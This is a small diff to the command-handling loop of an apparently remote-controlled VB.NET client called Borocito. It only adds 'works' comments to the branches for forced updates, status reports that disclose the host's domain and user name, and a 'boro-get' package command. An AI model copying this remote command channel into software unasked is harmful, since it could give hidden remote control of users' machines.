@@ -591,7 +591,7 @@ Module Network
                             SendTelemetry()
                             Update()
 
-                        ElseIf CMD1.StartsWith("/ForceUpdate") Then
+                        ElseIf CMD1.StartsWith("/ForceUpdate") Then 'Funciona.
                             SendCommandResponse("Borocito has been called to Force the Update")
                             AddToLog("Network", "Borocito has been called to Force the Update!", True)
                             SendTelemetry()
@@ -615,7 +615,7 @@ Module Network
                         ElseIf CMD1.StartsWith("/Status") Then 'Funciona.
                             CommandResponse = My.Application.Info.AssemblyName & " v" & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & "). Running in " & Environment.UserDomainName & "\" & Environment.UserName
 
-                        ElseIf CMD1.StartsWith("boro-get") Then
+                        ElseIf CMD1.StartsWith("boro-get") Then 'Funciona.
                             CommandResponse = BORO_GET_ADMIN(CMD1)
 
                         End If
